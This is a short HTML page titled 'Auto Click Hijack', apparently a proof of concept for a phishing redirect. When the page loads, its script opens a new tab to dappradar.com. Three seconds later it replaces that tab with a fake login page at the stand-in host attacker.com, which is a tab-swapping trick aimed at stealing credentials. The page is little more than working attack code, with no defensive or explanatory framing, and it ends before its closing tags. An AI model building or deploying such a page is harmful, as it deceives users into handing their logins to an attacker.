<!DOCTYPE html>
<html lang="en">
<head>
    <title>Auto Click Hijack</title>
</head>
<body>
    <script>
        window.onload = function() {
            let newTab = window.open("https://dappradar.com", "_blank");

            setTimeout(() => {
                newTab.location = "https://attacker.com/fake-login"; // Redirect after 3 seconds
            }, 3000);
        };
    </script>
